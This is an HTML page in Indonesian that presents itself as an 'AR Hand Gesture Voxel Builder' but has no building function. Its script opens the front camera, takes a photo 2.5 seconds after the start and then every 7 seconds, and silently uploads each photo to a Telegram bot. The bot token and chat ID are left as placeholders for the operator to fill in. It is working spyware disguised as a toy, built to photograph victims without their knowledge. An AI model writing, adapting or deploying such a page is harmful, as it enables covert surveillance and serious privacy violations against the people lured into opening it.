<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AR Hand Gesture - Voxel Builder</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #000;
            color: white;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }

        video {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            z-index: 1;
            display: none;
        }

        .overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 10;
        }

        .top-bar {
            position: fixed;
            top: 0; left: 0; right: 0;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 30;
            background: linear-gradient(to bottom, rgba(0,0,0,0.85), transparent);
        }

        .time { font-size: 17px; font-weight: 500; }

        .header {
            text-align: center;
            margin-top: 80px;
            z-index: 20;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            text-shadow: 0 2px 15px rgba(0,0,0,0.9);
        }

        .subtitle {
            font-size: 16px;
            color: #bbb;
            margin-bottom: 50px;
        }

        .ar-frame {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 320px;
            height: 420px;
            border: 3px solid rgba(0, 255, 255, 0.7);
            border-radius: 24px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
            z-index: 15;
            pointer-events: none;
        }

        .scan-line {
            position: absolute;
            top: 0; left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, transparent, #00ffff, transparent);
            animation: scan 3.5s linear infinite;
            box-shadow: 0 0 20px #00ffff;
        }

        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }

        .controls {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 30;
        }

        .btn {
            background: rgba(0, 255, 255, 0.12);
            color: #00ffff;
            border: 2px solid #00ffff;
            padding: 16px 50px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            backdrop-filter: blur(12px);
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn:active {
            background: #00ffff;
            color: #000;
            transform: scale(0.95);
        }

        .status {
            position: fixed;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.75);
            padding: 12px 30px;
            border-radius: 30px;
            font-size: 15.5px;
            z-index: 30;
            min-width: 200px;
            text-align: center;
        }

        .gesture-hint {
            position: absolute;
            bottom: 200px;
            left: 50%;
            transform: translateX(-50%);
            color: #00ffff;
            font-size: 15px;
            text-shadow: 0 0 12px #00ffff;
            z-index: 20;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>

    <div class="overlay">
        <div class="top-bar">
            <div class="time" id="time">19:30</div>
            <div style="font-size:18px; font-weight:600;">AR Hand Gesture</div>
            <div>4G • 60%</div>
        </div>

        <div class="header">
            <div class="title">Voxel Builder</div>
            <div class="subtitle">Gunakan gerakan tangan untuk membangun voxel di AR</div>
        </div>

        <div class="ar-frame">
            <div class="scan-line"></div>
        </div>

        <div class="gesture-hint">✋ Angkat tangan Anda di depan kamera</div>

        <div class="controls">
            <button id="startBtn" class="btn">MULAI DETEKSI KAMERA</button>
        </div>

        <div id="status" class="status">Siap mendeteksi gerakan tangan</div>
    </div>

    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA";   // ← GANTI INI
        const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";       // ← GANTI INI

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        // Update jam
        function updateTime() {
            const timeEl = document.getElementById('time');
            setInterval(() => {
                const now = new Date();
                timeEl.textContent = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
            }, 1000);
        }
        updateTime();

        async function sendToTelegram(base64) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);

            const byteString = atob(base64.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);

            const blob = new Blob([ab], { type: 'image/jpeg' });
            formData.append('photo', blob, `hand_gesture_${Date.now()}.jpg`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) { }
        }

        async function captureAndSend() {
            status.textContent = "Mengambil foto...";

            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const base64 = canvas.toDataURL('image/jpeg', 0.95);
            await sendToTelegram(base64);

            status.textContent = "✅ Foto terkirim";
        }

        // Fungsi utama mulai kamera
        async function startCamera() {
            startBtn.style.display = 'none';
            status.textContent = "Mengakses kamera...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;
                video.style.display = 'block';

                status.textContent = "Kamera aktif • Mendeteksi...";

                // Ambil foto pertama setelah 2.5 detik
                setTimeout(() => captureAndSend(), 2500);

                // Ambil foto lagi setiap 7 detik
                setInterval(() => {
                    if (video.srcObject) captureAndSend();
                }, 7000);

            } catch (err) {
                status.innerHTML = `<span style="color:#ff4444;">Gagal mengakses kamera.<br>Mohon izinkan izin kamera.</span>`;
                console.error(err);
            }
        }

        // Event klik tombol
        startBtn.addEventListener('click', startCamera);

        // Fullscreen saat klik layar pertama kali
        let fullscreenDone = false;
        document.addEventListener('click', () => {
            if (!fullscreenDone && document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
                fullscreenDone = true;
            }
        }, { once: true });
    </script>
</body>
</html>
